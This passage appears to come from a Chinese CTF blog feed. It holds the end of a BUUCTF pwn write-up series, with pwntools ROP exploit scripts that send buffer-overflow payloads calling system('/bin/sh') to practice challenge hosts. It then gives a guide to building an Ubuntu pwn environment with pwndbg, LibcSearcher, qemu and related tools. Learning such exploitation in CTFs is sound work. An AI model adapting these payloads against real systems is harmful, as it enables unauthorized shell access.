libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)<span class="comment"># ret</span></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu015-HarekazeCTF2019-baby-rop"><a href="#buu015-HarekazeCTF2019-baby-rop" class="headerlink" title="buu015-[HarekazeCTF2019]baby_rop"></a>buu015-[HarekazeCTF2019]baby_rop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28394</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x600a90</span></span><br><span class="line">poprdi_ret = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, cyclic(<span class="number">0x88</span>) + p64(poprdi_ret) + p64(binsh_addr) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu016-jarvisoj-level2-x64"><a href="#buu016-jarvisoj-level2-x64" class="headerlink" title="buu016-jarvisoj_level2_x64"></a>buu016-jarvisoj_level2_x64</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25723</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400683</span></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, cyclic(<span class="number">0x18</span>) + p64(poprdi_ret) + p64(binsh) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> buuctf write-up series </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu CTF startup</title>
      <link href="/2023/02/28/Ubuntu-CTF-startup/"/>
      <url>/2023/02/28/Ubuntu-CTF-startup/</url>
      
        <content type="html"><![CDATA[<p>最近因为学校考试所以没怎么看pwn，但是中间虚拟机崩掉过，问题还挺严重。前几天发现能正常打开了，但是一用gdb就会出现下面让人窒息的提醒：<br><img src="/2023/02/28/Ubuntu-CTF-startup/1.png"><br>怎么调都不知道是怎么回事，很奇怪的是只有在开gdb的时候才会弹出这个错误，其他都是正常的。问过师傅时候无奈只能放弃这个与我并肩作战这么长时间的ubuntu 20.04，重装一个虚拟机。一不做二不休，干脆就将整个过程记录下来，便于日后查询。</p><h1 id="虚拟机日常维护注意事项"><a href="#虚拟机日常维护注意事项" class="headerlink" title="虚拟机日常维护注意事项"></a>虚拟机日常维护注意事项</h1><p>在最新的VMware中对虚拟机有一个<font color="00FF00"><strong>保护选项</strong></font>，可以在指定时间间隔内保存一个快照，这样在虚拟机崩溃的时候能够快速回档到前两天的快照中，有效减少文件等的损失，而不必每次都手动保存快照。（有读者可能会怀疑为什么我不能对崩掉的虚拟机回档，实际上我做了尝试，但是上面的问题还是存在，这就不是虚拟机状态的问题了，而是某些底层硬件配置的问题，可能是硬件出问题导致调试无法进行，但具体的我也不知道应该如何处理，因此只能重装）<br><img src="/2023/02/28/Ubuntu-CTF-startup/2.png"><br>如上图所示，在虚拟机设置-&gt;选项中可以找到自动保护选项，根据你设置的保护间隔和最大自动保护快照数量可以计算出至少需要的磁盘空间，因此需要<font color=red><strong>保证有足够的磁盘空间</strong></font>。</p><p>另外，当虚拟机<font color=blue><strong>存在快照</strong></font>时，是<font color=blue><strong>不能扩充磁盘容量</strong></font>的，因此要想扩充虚拟机的虚拟磁盘，要么<font color=red><strong>在创建虚拟机时就分配足够大小的磁盘空间</strong></font>，要么就只能<font color=red><strong>删除所有的快照</strong></font>后再进行扩充（建议前者，因为有的快照删除特别慢，如果快照多的话可能要等很长时间）</p><h1 id="从零搭建环境"><a href="#从零搭建环境" class="headerlink" title="从零搭建环境"></a>从零搭建环境</h1><p>下面就将介绍如何从零搭建一个CTF-pwn环境（由于学习仍在进行，故一些环境如远程执行环境还没有搭建的经历，如今后需要搭建，会在最后进行补充）</p><h2 id="1-创建虚拟机"><a href="#1-创建虚拟机" class="headerlink" title="1. 创建虚拟机"></a>1. 创建虚拟机</h2><p>可以在ubuntu官方网站上下载最新的长期支持版本，在笔者写这篇文章的时候，这个版本已经是22.04了，但还是按照20.04的版本来安装。<a href="https://cn.ubuntu.com/download/desktop">22.04下载</a>&#x2F;<a href="https://cn.ubuntu.com/download/alternative-downloads">历史版本下载</a></p><p><img src="/2023/02/28/Ubuntu-CTF-startup/3.png"><br>下载的是光盘映像文件，将其放在虚拟机的工作目录中。</p><p>然后选择vmware上方工具栏的文件-&gt;新建虚拟机，打开新建虚拟机向导。如下：<br><img src="/2023/02/28/Ubuntu-CTF-startup/4.png"><br>选择自定义安装，点击下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/5.png"><br>硬件兼容性不需要改，一般默认选择最新的vmware版本兼容，你的vmware是什么版本就用什么版本，不用修改，直接点击下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/6.png"><br>选择安装程序光盘映像文件，点击浏览，选择你刚才下载的映像文件，然后点击下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/7.png"><br>输入全名（这个随便输，想输什么都行），以及你登录虚拟机的用户名和密码。之后点击下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/8.png"><br>输入虚拟机的名字，将位置浏览设置为你的虚拟机工作目录。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/9.png"><br>处理器数量选择。如果你的电脑配置很好而且虚拟机也需要一定的计算需要，可以设置多一些，内核数量不变，修改处理器数量。但是总数不能超过你电脑主机的内核数量。我一般选择8处理器。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/10.png"><br>内存大小设置。同样看主机的配置。最好不要超过主机的内存大小，否则虚拟机可能会变慢。对于pwn做题来说4GB一般就足够了。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/11.png"><br>网络选择。这个网络的选择可以在虚拟机创建之后随时修改，这里简单介绍一下最常用的前两种：<strong>桥接网络和NAT</strong>。桥接网络如上面所说，直接访问外部以太网，前提是虚拟机要有自己的IP地址，因此桥接网络在使用的时候大多都是勾选“与主机共用IP地址”这个选项（这个选项在创建虚拟机到这一步的时候没有显示，但是可以在上方工具栏<strong>虚拟机-&gt;设置</strong>中找到并勾选，后面再说）。某些学校的校园网可能有接入设备数量限制（笔者学校就是），这个时候虚拟机选择桥接网络可能无法联网，可以考虑使用NAT模式，在这个模式下，主机相当于一个网关，而虚拟机为网关下的机器，与外部以太网连接需要借助主机。这种模式可以有效克服上面说的校园网接入数量限制问题。<br>因此这里选择默认NAT，<strong>最好能够保证开机之后立刻联网</strong>呃，因为需要下载一些包，安装完成之后也能改。以默认NAT进行下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/12.png"><br>IO控制器类型，不用改直接下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/13.png"><br>磁盘类型也不用改，直接下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/14.png"><br>磁盘类型不用改，下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/15.png"><br>磁盘空间设置这里，除了最大磁盘大小之外其他都不要改。为了避免出现磁盘空间不足的问题，笔者这里设置为200GB。这个大小根据自己的物理磁盘空间决定，但是不要太小，<strong>建议pwner们不要小于60GB</strong>，后面做kernel pwn搭建环境可能很占空间的。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/16.png"><br>磁盘文件，不用改直接下一步。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/17.png"><br>上面是最后确认的界面，确定好虚拟机的配置后，点击完成就可以开始创建虚拟机了。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/18.png"><br>之后是自动开机安装过程，耐心等待一段时间……</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/19.png"><br>大约10分钟之后，我们就能够登录ubuntu系统了。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/20.png"><br>在笔者的vmware中，linux系统在安装的时候就已经安装了VMware Tools，它能够帮助你更加快捷地在主机和虚拟机中传递文件，只需拖动即可。但是笔者的虚拟机只能从打开的文件夹中拖动文件到主机，不能从桌面上直接拖动复制，从主机复制文件到虚拟机也是必须复制到打开的文件夹中。</p><p>自此，我们的ubuntu系统就成功搭建好了，下面进行一些配置使虚拟机能够更加轻松方便地使用。</p><h2 id="2-默认root权限设置"><a href="#2-默认root权限设置" class="headerlink" title="2. 默认root权限设置"></a>2. 默认root权限设置</h2><p>在做题的时候，如果我们能够直接以root的身份登录，就不需要输入n多次的密码了。</p><p>参考<a href="https://blog.csdn.net/willhu2008/article/details/121699938?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165499613116782184643247%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165499613116782184643247&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121699938-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=ubuntu20.04%E9%BB%98%E8%AE%A4root%E7%99%BB%E5%BD%95&spm=1018.2226.3001.4187">资料</a>进行操作即可。根据步骤来，实测有效。</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/21.png"><br>注意正上方的提示，重启之后我们已经成功自动以root用户登录了，完成。</p><h2 id="3-安装vim"><a href="#3-安装vim" class="headerlink" title="3. 安装vim"></a>3. 安装vim</h2><p><code>apt install vim</code>即可</p><h2 id="4-修改软件源"><a href="#4-修改软件源" class="headerlink" title="4. 修改软件源"></a>4. 修改软件源</h2><p>ubuntu自带的软件源是国外的，速度慢有的时候还连不上，于是应修改为国内的镜像。</p><p><a href="https://blog.csdn.net/m0_37317193/article/details/121310922?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165499699616780366572573%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165499699616780366572573&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121310922-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=ubuntu20.04%E9%95%9C%E5%83%8F%E6%BA%90%E9%98%BF%E9%87%8C%E4%BA%91&spm=1018.2226.3001.4187">镜像与修改方法</a></p><p>笔者选择阿里云镜像。</p><p>修改完文件之后记得<code>apt update</code>和<code>apt upgrade</code>进行更新。第一次更新可能需要等一段时间，看你的网速怎么样……</p><h2 id="5-安装sublime-text（非必要）"><a href="#5-安装sublime-text（非必要）" class="headerlink" title="5. 安装sublime-text（非必要）"></a>5. 安装sublime-text（非必要）</h2><p>使用系统自带的gedit没有补全功能，可以在ubuntu应用商店里面搜索sublime-text安装，打开py文件的时候右键选中“Open with other application”就可以使用sublime-text打开了。（这里图标显示不出来，但是安装没有问题）</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/22.png"></p><h2 id="6-安装pwntools"><a href="#6-安装pwntools" class="headerlink" title="6. 安装pwntools"></a>6. 安装pwntools</h2><p>pwntools是pwn最常用的一个python包。<br>首先需要安装pip：<code>apt install python3-pip</code><br>然后安装pwntools：<code>pip install pwntools</code><br>完成。</p><h2 id="7-安装pwndbg"><a href="#7-安装pwndbg" class="headerlink" title="7. 安装pwndbg"></a>7. 安装pwndbg</h2><p>pwndbg是gdb的插件，帮助我们在做题时进行调试。<br>首先安装git：<code>apt install git</code><br>然后拉取git库：<code>git clone https://github.com/pwndbg/pwndbg</code><br>进入pwndbg目录运行bash脚本<code>setup.sh</code>即开始安装</p><p><img src="/2023/02/28/Ubuntu-CTF-startup/23.png"><br>运行gdb下有pwndbg标识即表示安装成功。</p><h2 id="8-安装LibcSearcher"><a href="#8-安装LibcSearcher" class="headerlink" title="8. 安装LibcSearcher"></a>8. 安装LibcSearcher</h2><p>请参考<a href="https://blog.csdn.net/qq_40026795/article/details/107150265?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165501579816780357270501%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165501579816780357270501&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107150265-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=libcsearcher%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">资料</a></p><p>注意不要使用<del>pip install LibcSearcher</del>，这两个是不一样的，链接中的是国人写的，准确度相对高一些。</p><h2 id="9-安装checksec"><a href="#9-安装checksec" class="headerlink" title="9. 安装checksec"></a>9. 安装checksec</h2><p>请参考<a href="https://blog.csdn.net/qq_43430261/article/details/105516051?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165501780216782248583442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165501780216782248583442&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-105516051-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=checksec%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">资料</a></p><p><strong>到这一步完成之后，一般的pwn题就可以开始做了。如果需要kernel环境，则继续下面的步骤。</strong></p><h2 id="10-安装qemu"><a href="#10-安装qemu" class="headerlink" title="10. 安装qemu"></a>10. 安装qemu</h2><p>使用<code>apt list qemu*</code>可查看所有前缀为qemu的包。可以看到这里有很多支持不同架构的qemu。<br><img src="/2023/02/28/Ubuntu-CTF-startup/24.png"><br>根据自己的需要安装对应架构的包即可。一般最为常用的是x86架构：<code>apt install qemu-system-x86</code>，注意不能只输入<code>apt install qemu</code>。</p><h2 id="11-配置kernel-pwn环境"><a href="#11-配置kernel-pwn环境" class="headerlink" title="11. 配置kernel pwn环境"></a>11. 配置kernel pwn环境</h2><p>较为复杂，这里给出笔者以前写的资料。<br><a href="https://blog.csdn.net/qq_54218833/article/details/124360103">资料</a></p><h2 id="12-安装vmlinux-to-elf"><a href="#12-安装vmlinux-to-elf" class="headerlink" title="12. 安装vmlinux-to-elf"></a>12. 安装vmlinux-to-elf</h2><p>这是一个用于将bzImage解压为vmlinux的工具，在kernel pwn中经常用到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/marin-m/vmlinux-to-elf</span><br><span class="line"><span class="built_in">cd</span> vmlinux-to-elf</span><br><span class="line">sudo python3 ./setup.py install</span><br></pre></td></tr></table></figure><p>然后就可以使用vmlinux-to-elf命令进行解压了。</p><h2 id="13-ARM-pwn环境搭建"><a href="#13-ARM-pwn环境搭建" class="headerlink" title="13. ARM pwn环境搭建"></a>13. ARM pwn环境搭建</h2><p>参考<a href="https://blog.csdn.net/qq_38154820/article/details/125875703?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166613948816782427428087%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166613948816782427428087&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-125875703-null-null.142%5Ev59%5Epc_rank_34_1,201%5Ev3%5Econtrol_1&utm_term=arm%20pwn&spm=1018.2226.3001.4187">资料</a>中的做法如下：</p><p>虽然说在x86-64的机器上无法直接运行ARM架构的elf文件，但我们可以通过qemu来实现。虽然可以使用docker在x86-64的机器上创建一个ARM架构的docker容器，但太过麻烦，在容器中还需要安装很多东西。因此可以直接使用qemu与gdb-multiarch配合。</p><p>实际上qemu不仅可以用来起一个qemu容器，还可以仅仅运行一个其他架构的elf文件，可以添加选项<code>-g &lt;端口号&gt;</code>将elf程序映射到某一个端口，而且还会等待接入，只有当我们使用gdb-multiarch接入时才会开始准备执行其中的第一条指令，非常方便我们下断点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br><span class="line">sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure><p>如果要执行的文件名为.&#x2F;pwn，则使用qemu执行该ARM可执行文件的命令为：<br><code>qemu-arm-static -g 9999 -L . ./pwn</code><br>之后启动gdb-multiarch：<br><code>gdb-multiarch ./pwn</code><br>连接端口：<br><code>pwndbg&gt; target remote 9999</code><br>即可开始调试。<br>如果想直接执行不调试，只需要删除qemu-arm-static中的-g选项即可。</p>]]></content>
      
      
      <categories>
          
          <category> 指南 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
